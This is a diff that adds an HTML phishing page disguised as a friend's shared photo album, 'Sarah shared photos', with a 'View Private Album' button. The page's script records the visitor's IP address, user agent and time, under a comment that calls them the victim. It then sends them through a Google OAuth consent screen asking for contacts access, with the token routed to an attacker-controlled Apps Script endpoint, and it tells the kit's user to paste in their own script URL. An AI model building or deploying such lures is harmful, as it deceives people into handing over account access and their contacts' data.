@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Sarah shared album</title>
+<meta name="viewport" content="width=device-width">
+<style>
+body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;font-family:system-ui;padding:40px;text-align:center;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
+h1{font-size:32px;margin-bottom:20px}
+p{font-size:18px;margin-bottom:40px;max-width:350px;line-height:1.5}
+.btn{background:#4285f4;color:white;padding:20px 50px;border-radius:30px;font-size:20px;text-decoration:none;display:inline-block;box-shadow:0 10px 30px rgba(66,133,244,.4)}
+.photos{display:grid;grid-template-columns:repeat(3,1fr);gap:15px;max-width:300px;margin:30px 0}
+.photo{background:hsla(0,0%,100%,.15);height:100px;border-radius:20px;backdrop-filter:blur(10px)}
+</style>
+</head>
+<body>
+<h1>🎉 Sarah shared photos!</h1>
+<p>Sarah invited you to private album - 47 new pictures</p>
+<div class="photos">
+<div class="photo"></div><div class="photo"></div><div class="photo"></div>
+<div class="photo"></div><div class="photo"></div><div class="photo"></div>
+</div>
+<a href="#" onclick="authGoogle()" class="btn">🔓 View Private Album</a>
+
+<script>
+// **PASTE YOUR APPS SCRIPT URL HERE 👇**
+const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxImqeKaRNAu8v67CAhdfdXPyvIukgzUIhZMmUNPPU0HJEpY5n80vdPMWVK774eIcUB/exec';
+
+async function authGoogle() {
+  const btn = event.target;
+  btn.innerText = 'Authorizing...';
+  
+  // Track victim first
+  const victim = await fetch('https://api.ipify.org?format=json')
+    .then(r=>r.json()).then(d=>({ip:d.ip,ua:navigator.userAgent,time:Date.now()}));
+  
+  // Trigger OAuth with CORRECT CONTACTS SCOPE
+  const authUrl = `${SCRIPT_URL}?action=auth&victim=${btoa(JSON.stringify(victim))}&scope=https://www.google.com/m8/feeds`;
+  window.location.href = 'https://accounts.google.com/o/oauth2/v2/auth?scope=' + encodeURIComponent('https://www.google.com/m8/feeds') + '&response_type=token&redirect_uri=' + encodeURIComponent(SCRIPT_URL) + '&client_id=1086441796141-8k0v7j4j1k5g9h3b2m8n0p4q6r2s7t9u.apps.googleusercontent.com&prompt=consent&state=' + encodeURIComponent(authUrl);
+}
+</script>
+</body>
+  </html>
